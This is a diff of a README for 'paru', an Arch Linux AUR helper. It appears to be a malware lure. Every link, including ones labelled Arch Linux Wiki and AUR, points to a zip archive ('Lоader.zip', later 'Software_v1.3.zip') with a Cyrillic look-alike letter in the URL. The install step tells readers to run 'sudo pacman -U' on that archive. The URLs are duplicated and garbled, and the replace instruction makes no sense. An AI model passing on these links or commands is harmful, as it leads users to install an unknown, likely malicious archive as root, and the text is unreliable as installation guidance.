@@ -1,6 +1,6 @@
 # 🚀 paru - A Simple AUR Helper for Easy Package Management
 
-[![Download paru](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip)](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip)
+[![Download paru](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip)](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip)
 
 ## 📦 Overview
 
@@ -25,17 +25,17 @@
 
 To get **paru**, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip) to download the latest version.
 2. Choose your version based on your system requirements. Download the appropriate package.
 3. Once the download finishes, open a terminal window.
 4. Navigate to the folder where you downloaded the package.
 5. Install the package using the following command:
 
    ```bash
-   sudo pacman -U https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip
+   sudo pacman -U https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip
    ```
 
-   Replace `https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip` with the actual file name you downloaded.
+   Replace `https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip` with the actual file name you downloaded.
 
 ## 🌟 Basic Usage
 
@@ -81,7 +81,7 @@ For assistance, feel free to open an issue on our GitHub page. We are here to he
 
 ## 🔗 Additional Resources
 
-- [Arch Linux Wiki](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip)
-- [AUR (Arch User Repository)](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip)
+- [Arch Linux Wiki](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip)
+- [AUR (Arch User Repository)](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip)
 
-Remember to visit the [Releases page](https://raw.githubusercontent.com/MarnuDeWet/paru/main/Lоader.zip) to stay updated with the latest releases of paru. Your journey towards efficient package management starts here. Enjoy using paru!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zipоhttps://raw.githubusercontent.com/MarnuDeWet/paru/main/tricolored/Software_v1.3.zip) to stay updated with the latest releases of paru. Your journey towards efficient package management starts here. Enjoy using paru!
